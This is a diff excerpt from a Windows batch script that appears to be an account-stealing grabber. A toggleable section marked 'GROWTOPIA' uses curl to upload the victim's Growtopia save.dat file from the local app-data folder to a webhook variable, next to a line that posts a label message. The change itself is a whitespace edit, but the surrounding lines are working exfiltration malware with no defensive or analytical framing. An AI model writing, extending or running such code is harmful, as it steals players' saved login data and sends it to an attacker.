@@ -205,7 +205,7 @@ goto skipminecraft
 :: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ---------------------------------------------------------
 goto skipgrowtopia
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` - GROWTOPIA -```\"}"  %webhook%
+	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- GROWTOPIA -```\"}"  %webhook%
 	curl --silent --output /dev/null -F save.dat=@"%localappdata%\Growtopia\save.dat" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
